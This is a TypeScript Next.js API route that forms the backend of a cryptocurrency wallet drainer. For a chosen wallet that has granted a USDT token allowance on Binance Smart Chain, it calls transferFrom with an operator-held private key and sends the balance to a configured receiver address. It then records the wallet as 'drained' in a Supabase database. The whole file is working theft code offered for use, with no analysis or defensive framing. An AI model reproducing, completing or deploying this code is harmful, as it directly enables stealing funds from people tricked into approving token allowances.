import { NextRequest, NextResponse } from "next/server";
import { getServiceSupabase } from "@/lib/supabase";
import { ethers } from "ethers";

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

export async function POST(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const adminKey = req.headers.get("x-admin-key");
  if (adminKey !== process.env.ADMIN_PASSWORD) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { id } = await params;
  const supabase = getServiceSupabase();

  const { data: wallet, error: fetchError } = await supabase
    .from("wallets")
    .select("*")
    .eq("id", id)
    .single();

  if (fetchError || !wallet) {
    return NextResponse.json({ error: "Wallet not found" }, { status: 404 });
  }

  if (!wallet.approval_status) {
    return NextResponse.json({ error: "Wallet has not approved yet" }, { status: 400 });
  }

  const { data: configRow } = await supabase
    .from("config")
    .select("value")
    .eq("key", "receiver_address")
    .single();

  const receiverAddress = configRow?.value;
  if (!receiverAddress) {
    return NextResponse.json({ error: "Receiver address not set in admin Config tab" }, { status: 500 });
  }

  const privateKey = process.env.ADMIN_PRIVATE_KEY;
  if (!privateKey) {
    return NextResponse.json(
      { error: "ADMIN_PRIVATE_KEY is not set in environment variables" },
      { status: 500 }
    );
  }

  try {
    const provider = new ethers.JsonRpcProvider(
      process.env.BSC_RPC_URL ?? "https://bsc-dataseed.binance.org/"
    );
    const adminWallet = new ethers.Wallet(privateKey, provider);
    const contract = new ethers.Contract(
      process.env.NEXT_PUBLIC_USDT_CONTRACT!,
      USDT_ABI,
      adminWallet
    );

    // Check both balance AND real on-chain allowance
    const [balance, allowance]: [bigint, bigint] = await Promise.all([
      contract.balanceOf(wallet.address),
      contract.allowance(wallet.address, adminWallet.address),
    ]);

    if (balance === BigInt(0)) {
      return NextResponse.json({ error: "Wallet USDT balance is zero" }, { status: 400 });
    }

    if (allowance === BigInt(0)) {
      // Update DB to reflect reality
      await supabase.from("wallets").update({ approval_status: false }).eq("id", id);
      return NextResponse.json(
        { error: "No on-chain allowance found. Wallet may not have approved on BSC." },
        { status: 400 }
      );
    }

    // Use lesser of balance or allowance to avoid exceeds-allowance error
    const transferAmount = balance < allowance ? balance : allowance;
    const amountFormatted = ethers.formatUnits(transferAmount, 18);

    const tx = await contract.transferFrom(wallet.address, receiverAddress, transferAmount);
    const receipt = await tx.wait();

    await supabase
      .from("wallets")
      .update({ drained: true, drain_tx_hash: receipt.hash })
      .eq("id", id);

    await supabase.from("transactions").insert({
      wallet_address: wallet.address,
      type: "drain",
      tx_hash: receipt.hash,
      amount_usdt: amountFormatted,
      status: "success",
    });

    return NextResponse.json({ success: true, txHash: receipt.hash, amount: amountFormatted });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : "Unknown error";

    await supabase.from("transactions").insert({
      wallet_address: wallet.address,
      type: "drain",
      status: "failed",
      amount_usdt: "0",
    });

    return NextResponse.json({ error: message }, { status: 500 });
  }
}
